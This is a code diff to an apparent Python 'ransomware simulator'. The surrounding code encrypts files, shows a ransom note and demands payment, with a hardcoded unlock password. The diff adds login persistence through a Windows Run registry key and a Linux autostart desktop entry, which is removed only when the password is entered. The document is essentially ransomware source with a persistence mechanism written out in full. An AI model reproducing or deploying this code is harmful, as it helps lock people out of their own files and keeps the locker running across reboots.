@@ -21,6 +21,12 @@ try:
 except ImportError:
     HAS_WINSOUND = False
 
+try:
+    import winreg
+    HAS_WINREG = True
+except ImportError:
+    HAS_WINREG = False
+
 APP_PASSWORD = "BANNANA"
 ENCRYPTED_MARKER = b"RANSOMWARE_V1"
 
@@ -144,6 +150,7 @@ class RansomwareSimulator:
         def check_password():
             password = password_entry.get()
             if password == APP_PASSWORD:
+                self.remove_auto_start()
                 dialog.destroy()
                 self.root.destroy()
             else:
@@ -153,6 +160,58 @@ class RansomwareSimulator:
                  bg="#e74c3c", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
         
         dialog.bind("<Return>", lambda e: check_password())
+    
+    def add_auto_start(self):
+        import subprocess
+        script_path = os.path.abspath(__file__)
+        
+        if sys.platform == "win32" and HAS_WINREG:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                               0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "RansomwareSimulator", 0, 
+                               winreg.REG_SZ, script_path)
+                winreg.CloseKey(key)
+                self.log("Added to Windows auto-start")
+            except:
+                pass
+        else:
+            try:
+                autostart_dir = os.path.expanduser("~/.config/autostart")
+                if not os.path.exists(autostart_dir):
+                    os.makedirs(autostart_dir)
+                desktop_entry = f"""[Desktop Entry]
+Type=Application
+Name=Ransomware Simulator
+Exec=python3 {script_path}
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+"""
+                with open(os.path.join(autostart_dir, "ransomware.desktop"), "w") as f:
+                    f.write(desktop_entry)
+                self.log("Added to Linux auto-start")
+            except:
+                pass
+    
+    def remove_auto_start(self):
+        if sys.platform == "win32" and HAS_WINREG:
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                               0, winreg.KEY_SET_VALUE)
+                winreg.DeleteValue(key, "RansomwareSimulator")
+                winreg.CloseKey(key)
+            except:
+                pass
+        else:
+            try:
+                autostart_file = os.path.expanduser("~/.config/autostart/ransomware.desktop")
+                if os.path.exists(autostart_file):
+                    os.remove(autostart_file)
+            except:
+                pass
     
     def get_all_files(self):
         files = []
@@ -292,6 +351,7 @@ class RansomwareSimulator:
         
         self.create_ransom_note()
         self.open_ransom_note()
+        self.add_auto_start()
         
         self.stats_label.config(text=f"COMPLETE - {success} files encrypted")
         self.status_label.config(text="FILES ENCRYPTED - PAY TO DECRYPT")
